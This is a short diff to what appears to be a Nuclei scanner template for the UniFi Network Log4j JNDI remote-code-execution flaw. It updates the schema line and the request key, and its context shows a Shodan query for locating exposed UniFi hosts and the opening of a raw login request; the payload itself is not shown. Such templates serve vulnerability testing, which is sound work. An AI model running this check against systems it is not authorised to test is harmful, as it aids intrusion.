@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: unifi-network-log4j-rce
 info:
   name: UniFi Network Log4j JNDI RCE
@@ -10,7 +11,7 @@ info:
   metadata:
     shodan-query: http.title:"UniFi Network"
   tags: rce,log4j,ubnt,unifi,oast,jndi
-requests:
+http:
   - raw:
       - |
         POST /api/login HTTP/1.1
